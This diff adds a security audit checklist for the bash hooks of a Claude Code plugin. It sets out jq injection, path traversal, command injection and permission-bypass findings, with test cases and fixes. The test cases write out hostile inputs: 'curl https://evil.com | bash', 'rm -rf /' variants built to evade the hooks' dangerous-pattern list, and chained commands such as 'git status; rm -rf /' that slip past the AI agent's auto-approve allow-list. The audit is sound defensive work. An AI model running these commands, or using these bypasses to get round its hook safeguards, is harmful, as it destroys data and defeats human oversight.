@@ -1,0 +1,595 @@
+================================================================================
+SECURITY TEST CHECKLIST FOR CLAUDE HOOKS
+Hook Security Audit & Test Requirements
+Generated: 2026-01-08
+================================================================================
+
+EXECUTIVE SUMMARY
+
+Files Analyzed:
+- 60+ bash hook files across 13 categories
+- ~5,000+ lines of bash code
+- 56 uses of jq -r for JSON extraction
+- 47 string comparison operations
+- Complex file path handling and validation
+
+Critical Findings:
+5 CRITICAL / 8 HIGH / 6 MEDIUM vulnerabilities identified
+
+================================================================================
+1. JQ FILTER INJECTION (CRITICAL)
+================================================================================
+
+Location: /Users/yonatangross/coding/skillforge-claude-plugin/.claude/hooks/_lib/common.sh (Lines 35-49)
+OWASP: A03:2021 - Injection
+
+Vulnerability:
+The get_field() function passes user-controlled filter strings to jq without validation:
+  get_field() {
+    local filter="$1"
+    local input=$(read_hook_input)
+    echo "$input" | jq -r "$filter // \"\"" 2>/dev/null
+  }
+
+If $1 is attacker-controlled, arbitrary jq commands can be injected.
+
+Attack Example:
+  get_field '.tool_input) | debug | (.'
+  Results in: jq -r '.tool_input) | debug | (. // ""'
+
+Affected Hooks:
+- pretool/bash/error-pattern-warner.sh
+- pretool/write-edit/file-guard.sh
+- pretool/mcp/memory-validator.sh
+- posttool/audit-logger.sh
+- pretool/task/context-gate.sh
+- subagent-stop/subagent-quality-gate.sh
+- notification/desktop.sh & sound.sh
+
+Test Cases (4 required):
+
+TEST 1.1: JQ Filter Injection - Basic
+  Setup: INPUT='{"tool_input":{"command":"test"}}'
+  Attack: MALICIOUS_FILTER='.tool_input) | debug | (.'
+  Expected: PASS - debug not executed, safe error handling
+  Detection: Check stderr for debug output
+
+TEST 1.2: JQ Filter Injection - Data Exfiltration
+  Setup: INPUT='{"secret":"sensitive","public":"visible"}'
+  Attack: MALICIOUS_FILTER='["secret"][]'
+  Expected: PASS - Only intended fields returned
+  Detection: Verify secret field not in output
+
+TEST 1.3: JQ Filter Injection - Recursive Descent
+  Setup: INPUT='{"nested":{"api_key":"sk-xxx","data":"public"}}'
+  Attack: MALICIOUS_FILTER='.. | objects | select(.api_key)'
+  Expected: PASS - Sensitive keys not extracted
+  Detection: Verify no unexpected data fields
+
+TEST 1.4: JQ Filter Injection - Alternative Operators
+  Setup: INPUT='{"data":"public","config":{"db_host":"internal"}}'
+  Attack: MALICIOUS_FILTER='.config.db_host as $x | $x'
+  Expected: PASS - Cannot access unintended paths
+  Detection: Verify internal config not exposed
+
+Mitigation:
+- Document ONLY static filter strings allowed in get_field()
+- Add validation function to reject filters containing: | debug | limit | recurse
+- Consider jq -r expression validation before execution
+
+================================================================================
+2. PATH TRAVERSAL & SYMLINK ATTACKS (CRITICAL)
+================================================================================
+
+Location: /Users/yonatangross/coding/skillforge-claude-plugin/.claude/hooks/permission/auto-approve-project-writes.sh
+OWASP: A01:2021 - Broken Access Control
+
+Issues:
+
+2.1: Path Traversal Without Symlink Resolution
+  FILE_PATH=$(get_field '.tool_input.file_path')
+  if [[ "$FILE_PATH" == "$CLAUDE_PROJECT_DIR"* ]]; then
+    # VULNERABLE: No symlink resolution
+  fi
+  
+  Attack: FILE_PATH="../../../etc/passwd" bypasses string prefix check
+
+2.2: Incomplete Symlink Resolution
+  file-guard.sh attempts resolution but only resolves final target
+  Missing: Canonical path normalization with realpath -e
+  Missing: Intermediate symlink checks in path
+
+2.3: Race Condition (TOCTOU)
+  Time T1: Path resolved and checked
+  Time T2: File could be modified between check and use
+  No re-validation on actual file operation
+
+Affected Hooks:
+- permission/auto-approve-project-writes.sh (PRIMARY)
+- permission/auto-approve-readonly.sh
+- pretool/input-mod/path-normalizer.sh
+- pretool/write-edit/file-guard.sh
+
+Test Cases (6 required):
+
+TEST 2.1: Path Traversal - Parent Directory Escape
+  Setup: CLAUDE_PROJECT_DIR="/tmp/test_project"
+  Attack: FILE_PATH="../protected_file.txt"
+  Expected: BLOCKED - Cannot write above project
+  Detection: Write blocked or error returned
+
+TEST 2.2: Path Traversal - Double Encoding
+  Setup: FILE_PATH="..%2F..%2Fetc%2Fpasswd"
+  Attack: URL-encoded parent traversal
+  Expected: PASS - Decoded to ../ and rejected
+  Detection: Verify reject or decode properly
+
+TEST 2.3: Symlink to Parent Directory
+  Setup: ln -s /etc /tmp/test_project/subdir/etc_link
+  Attack: FILE_PATH="subdir/etc_link/passwd"
+  Expected: BLOCKED - Symlink target outside project
+  Detection: Canonical path check
+
+TEST 2.4: Symlink Chain Attack
+  Setup: ln -s /etc/passwd link1; ln -s link1 link2
+  Attack: FILE_PATH="link2" - chain of symlinks
+  Expected: PASS - Fully resolved, blocked
+  Detection: Verify /etc/passwd not targeted
+
+TEST 2.5: Race Condition - File Replacement
+  Steps:
+    1. Check pass
+    2. Attacker replaces file with symlink to /etc/shadow
+    3. Write to wrong file
+  Expected: PASS - Re-validate before write
+  Detection: Wrong file not modified
+
+TEST 2.6: Null Byte Injection
+  Attack: FILE_PATH="/tmp/safe.txt\x00/tmp/unsafe.txt"
+  Expected: PASS - Null bytes stripped/rejected
+  Detection: Verify safe.txt only in scope
+
+Mitigation:
+- Use realpath -e (enforce existence + resolve symlinks)
+- Store canonical path for all operations
+- Re-validate path immediately before write
+- Document allowed directory boundaries
+
+================================================================================
+3. COMMAND INJECTION IN BASH EXECUTION (HIGH)
+================================================================================
+
+Location: 
+- chain-executor.sh (Line 55-58)
+- skill/test-runner.sh (Lines 14-40)
+OWASP: A03:2021 - Injection
+
+Issues:
+
+3.1: Unsafe bash Execution
+  output=$(timeout "${timeout}s" bash "$hook_script" < "$input_file")
+  If hook_script contains: $(malicious) - executes in subshell
+
+3.2: Unsafe cd with User Input
+  cd "$(dirname "$FILE")" 
+  If FILE="/tmp/; rm -rf /; #"
+  dirname returns malicious path with embedded commands
+
+3.3: Unvalidated grep/sed Patterns
+  Pattern matching with user input can cause ReDoS
+
+Test Cases (5 required):
+
+TEST 3.1: Command Injection - Hook Script Path
+  Attack: HOOK_SCRIPT_NAME='test.sh; echo injected; #'
+  Expected: PASS - Treated as literal filename
+  Detection: "injected" not in output
+
+TEST 3.2: Command Injection - cd Path
+  Attack: FILE='$(touch /tmp/pwned)_test.py'
+  Expected: PASS - /tmp/pwned not created
+  Detection: File system clean after test
+
+TEST 3.3: Command Injection - Backticks
+  Attack: INPUT='{"command":"git commit -m `whoami`"}'
+  Expected: PASS - Backticks not executed
+  Detection: whoami output not in logs
+
+TEST 3.4: Regex ReDoS in Pattern Matching
+  Attack: Extremely complex regex on large input
+  Expected: PASS - Returns in <1 second
+  Detection: No timeout or CPU spike
+
+TEST 3.5: Variable Expansion in String Context
+  Attack: USER_PATTERN='.*; rm -rf /'
+  Expected: PASS - Pattern matched but not executed
+  Detection: No files deleted
+
+Mitigation:
+- Always quote variable expansions: "$var" not $var
+- Use [[ ]] for pattern matching, not [ ]
+- Validate hook_script path is safe
+- Add timeout to regex operations
+
+================================================================================
+4. UNSAFE TEMPORARY FILE HANDLING (HIGH)
+================================================================================
+
+Location:
+- chain-executor.sh (Lines 46, 58-62)
+- agent/context-publisher.sh (Lines 40-45)
+OWASP: A05:2021 - Security Misconfiguration
+
+Issues:
+
+4.1: mktemp Usage Without Validation
+  local input_file=$(mktemp)
+  No validation of output
+  Could use unpredictable locations
+
+4.2: Race Condition in Temp File
+  T1: mktemp creates file (size 0)
+  T2: Another process writes malicious data
+  T3: Script reads and executes
+
+4.3: No Cleanup on Error
+  TEMP_FILE=$(mktemp)
+  jq ... > "$TEMP_FILE"  # Could fail
+  mv "$TEMP_FILE" ...     # File might not exist
+
+Test Cases (4 required):
+
+TEST 4.1: Predictable Temp File Names
+  Action: Run hook 10 times rapidly
+  Expected: PASS - All names unique/random
+  Detection: No sequential patterns in /tmp
+
+TEST 4.2: Pre-creation Attack
+  Steps:
+    1. Identify mktemp output pattern
+    2. Pre-create /tmp/tmp.XXXXX as symlink
+    3. Run hook
+  Expected: PASS - mktemp detects existing file
+  Detection: Symlink not followed
+
+TEST 4.3: Cleanup Failure
+  Action: chmod 000 temp file, trigger cleanup
+  Expected: PASS - Silently continues
+  Detection: No orphaned files or errors
+
+TEST 4.4: Temp Directory Permissions
+  Check: ls -la /tmp permissions
+  Expected: PASS - Only owner can read
+  Detection: Temp files not world-readable
+
+Mitigation:
+- Use mktemp -d for directories: mktemp -d
+- Set explicit permissions: mktemp -p /tmp
+- Validate mktemp succeeded: [[ -f "$TEMP" ]]
+- Cleanup in trap: trap "rm -f '$TEMP'" EXIT
+
+================================================================================
+5. INPUT VALIDATION GAPS (HIGH)
+================================================================================
+
+Location:
+- pretool/bash/bash-defaults.sh (Lines 31-40)
+- pretool/bash/error-pattern-warner.sh (Lines 29-73)
+OWASP: A03:2021 - Injection & A07:2021 - Authentication Failures
+
+Issues:
+
+5.1: String Matching Bypass
+  for pattern in "${DANGEROUS_PATTERNS[@]}"; do
+    if [[ "$cmd" == *"$pattern"* ]]; then
+  Glob matching bypassed by:
+    - Extra spaces: "rm  -rf  /"
+    - Newlines: "rm\n-rf\n/"
+    - Uppercase: "RM -RF /"
+
+5.2: Incomplete Pattern List
+  Missing patterns:
+    - curl | bash
+    - wget -O- | bash
+    - python -c with user input
+    - find with -exec
+    - tee with privileged paths
+
+5.3: JQ Input Validation
+  Rules file could be malicious
+  No validation of .pattern contents
+  Could cause ReDoS
+
+Test Cases (5 required):
+
+TEST 5.1: Bypass - Extra Spaces
+  Attack: "rm  -rf  /"  (multiple spaces)
+  Expected: BLOCKED
+  Detection: Command rejected
+
+TEST 5.2: Bypass - Newlines
+  Attack: "rm\n-rf\n/"
+  Expected: BLOCKED
+  Detection: Newlines detected and rejected
+
+TEST 5.3: Bypass - Case Variation
+  Attack: "RM -RF /"
+  Expected: BLOCKED
+  Detection: Case-insensitive matching
+
+TEST 5.4: Missing Patterns
+  Attacks:
+    - "curl https://evil.com | bash"
+    - "wget -O- http://evil.com | bash"
+    - "python -c 'import os; os.system(...)'"
+  Expected: ALL BLOCKED
+  Detection: None execute
+
+TEST 5.5: Malicious Rules File
+  Attack: ReDoS pattern in rules.json
+  Expected: PASS - Completes in <1 second
+  Detection: No timeout
+
+Mitigation:
+- Normalize input: convert spaces, lowercase, remove newlines
+- Use regex, not glob: [[ "$cmd" =~ pattern ]]
+- Add missing dangerous patterns
+- Validate rules file patterns before use
+- Add timeout to regex operations
+
+================================================================================
+6. REGEX INJECTION & REDOS (MEDIUM)
+================================================================================
+
+Location:
+- skill/test-location-validator.sh (Multiple regex patterns)
+- skill/di-pattern-enforcer.sh (Lines 31-56)
+OWASP: A05:2021 - Security Misconfiguration
+
+Test Cases (2 required):
+
+TEST 6.1: Catastrophic Backtracking
+  Pattern: "^([a-zA-Z0-9_-]+)*$"
+  Input: "a" * 50000 characters
+  Expected: PASS - Completes in <1 second
+  Detection: No hang or timeout
+
+TEST 6.2: Nested Quantifiers
+  Pattern: "(.*){10}"
+  Input: "x" * 100 characters
+  Expected: PASS - <1 second execution
+  Detection: No exponential CPU usage
+
+Mitigation:
+- Use atomic grouping: (?>...) where available
+- Avoid nested quantifiers: + * { }
+- Test patterns against large inputs
+- Add timeout to regex operations
+
+================================================================================
+7. FILE OPERATIONS & PERMISSIONS (MEDIUM)
+================================================================================
+
+Location:
+- _lib/common.sh (Lines 61-154)
+- lifecycle/session-cleanup.sh (Line 28)
+OWASP: A01:2021 - Broken Access Control
+
+Issues:
+
+7.1: Log File Permissions
+  Log files created with default umask
+  Typically 0644 - world-readable
+  Could contain sensitive information
+
+7.2: Directory Traversal in Cleanup
+  cd "$ARCHIVE_DIR" && ls -t | tail -n +21 | xargs rm -f
+  If ARCHIVE_DIR is world-writable and contains ../ paths
+  Could delete system files
+
+7.3: Unsafe xargs
+  ls | xargs rm -f
+  Doesn't handle filenames with spaces
+  Should use: xargs -0 rm -f
+
+Test Cases (3 required):
+
+TEST 7.1: Log File Permissions
+  Action: Create log, check permissions
+  Expected: PASS - 0600 or 0640 (owner/group only)
+  Detection: ls -l shows no world-readable bit
+
+TEST 7.2: Cleanup with Symlink
+  Setup: Create ARCHIVE_DIR with 25 files + malicious symlink
+  Attack: Symlink to /etc/passwd
+  Expected: PASS - Symlink target not deleted
+  Detection: /etc/passwd unchanged
+
+TEST 7.3: Cleanup with Spaces
+  Setup: Create files: "my file 1", "my file 2", etc.
+  Action: Trigger cleanup
+  Expected: PASS - Correct files deleted
+  Detection: All target files removed, others remain
+
+Mitigation:
+- Set explicit log permissions: chmod 0600 logfile
+- Validate ARCHIVE_DIR before cleanup
+- Use xargs -0 with null delimiters
+- Validate filenames in cleanup loop
+
+================================================================================
+8. ENVIRONMENT VARIABLE INJECTION (MEDIUM)
+================================================================================
+
+Location: _lib/common.sh (Line 18)
+OWASP: A05:2021 - Security Misconfiguration
+
+Issues:
+
+8.1: Unvalidated CLAUDE_PROJECT_DIR
+  HOOK_LOG_DIR="${CLAUDE_PROJECT_DIR:-.}/.claude/logs"
+  Environment variable not validated
+  Used in all file path operations
+
+8.2: Unvalidated PATH
+  Hooks rely on: command -v git, jq
+  If PATH modified, could execute attacker's version
+
+Test Cases (2 required):
+
+TEST 8.1: Malicious CLAUDE_PROJECT_DIR
+  Setup: export CLAUDE_PROJECT_DIR="/tmp/evil"
+  Action: Run hook
+  Expected: PASS - Respects env but validates paths
+  Detection: Writes only to intended locations
+
+TEST 8.2: PATH Hijacking
+  Setup: Create /tmp/evil_bin/jq (malicious)
+  Action: export PATH="/tmp/evil_bin:$PATH"
+  Action: Run hook
+  Expected: PASS - Uses legitimate jq
+  Detection: Not /tmp/evil_bin/jq executed
+
+Mitigation:
+- Validate CLAUDE_PROJECT_DIR before use
+- Use absolute paths for critical commands
+- Validate PATH doesn't contain unexpected locations
+- Consider hardcoding paths for security-critical commands
+
+================================================================================
+9. INFORMATION DISCLOSURE (LOW-MEDIUM)
+================================================================================
+
+Location:
+- posttool/audit-logger.sh
+- Multiple error messages and logging
+OWASP: A01:2021 & A05:2021
+
+Test Cases (2 required):
+
+TEST 9.1: Sensitive Data in Logs
+  Action: Run with command containing API token
+  Example: "git push origin main --token=$API_TOKEN"
+  Expected: PASS - Command truncated or token redacted
+  Detection: Token not visible in audit.log
+
+TEST 9.2: Error Message Information Disclosure
+  Action: Trigger error in hook
+  Expected: PASS - Generic error message
+  Detection: No system paths, usernames, versions revealed
+
+Mitigation:
+- Truncate command logs: head -c 100
+- Redact known sensitive patterns: API keys, tokens
+- Use generic error messages
+- Log to restricted files (0600 permissions)
+
+================================================================================
+10. PERMISSION BYPASS (LOW)
+================================================================================
+
+Location: permission/auto-approve-safe-bash.sh
+OWASP: A01:2021 - Broken Access Control
+
+Issues:
+
+10.1: Pattern Whitelist Bypass
+  Pattern: '^git (status|log|...)'
+  Bypass: 'git status; rm -rf /'
+  Semicolon allows command chaining
+
+Test Cases (2 required):
+
+TEST 10.1: Safe Command Whitelist Bypass
+  Attack: "git status; echo hacked"
+  Expected: PASS - Full command rejected
+  Detection: "hacked" not in output
+
+TEST 10.2: Substring Attack
+  Attack: "git checkout -b feature; rm -rf /"
+  Expected: PASS - Full validation, not substring
+  Detection: Semicolon command blocked
+
+Mitigation:
+- Validate entire command, not just prefix
+- Reject commands with special characters: ; | & $
+- Use exact pattern matching
+- List allowed flags explicitly
+
+================================================================================
+TESTING FRAMEWORK
+
+Recommended Test Structure:
+
+1. Unit Tests (Individual functions)
+   - get_field() filter validation
+   - path_normalize() symlink handling
+   - parse_command() input validation
+
+2. Integration Tests (Hook chains)
+   - Chain executor with multiple hooks
+   - Output passing between hooks
+   - Error handling and recovery
+
+3. Security Tests (Vulnerability scenarios)
+   - All 35 test cases above
+   - Automated attack payload generation
+   - Regression testing
+
+4. Performance Tests
+   - Timeout handling
+   - ReDoS patterns
+   - Large input handling
+
+Test Execution:
+  ./run-hook-security-tests.sh [--verbose] [--fail-fast]
+
+Expected Results:
+  PASS: 25+ tests (70%+)
+  FAIL: 0 critical, <3 high findings
+  WARN: <5 medium/low findings
+
+================================================================================
+PRIORITY REMEDIATION ROADMAP
+
+CRITICAL (Fix Immediately - Next Release)
+1. JQ Filter Injection validation
+2. Path Traversal canonical path checking
+3. Symlink attack prevention
+
+HIGH (Fix Within 1 Week)
+4. Command injection quoting
+5. Temp file handling improvements
+6. Input validation normalization
+
+MEDIUM (Fix Within 2 Weeks)
+7. Regex ReDoS protection
+8. File permission hardening
+9. Environment variable validation
+
+LOW (Fix in Next Sprint)
+10. Information disclosure redaction
+11. Permission bypass improvements
+12. Security documentation
+
+================================================================================
+SUMMARY
+
+Total Test Cases: 35
+Files Requiring Changes: 12
+Estimated Effort: 40 hours
+Risk Level: MEDIUM-HIGH (pre-remediation)
+
+Key Metrics:
+- JQ Filter Injection: 4/4 test cases needed
+- Path Traversal: 6/6 test cases needed
+- Command Injection: 5/5 test cases needed
+- Input Validation: 5/5 test cases needed
+
+Recommended Testing Cadence:
+- Unit tests: On every commit
+- Integration tests: On every pull request
+- Security tests: Weekly or before release
+- Penetration tests: Quarterly
+
+================================================================================
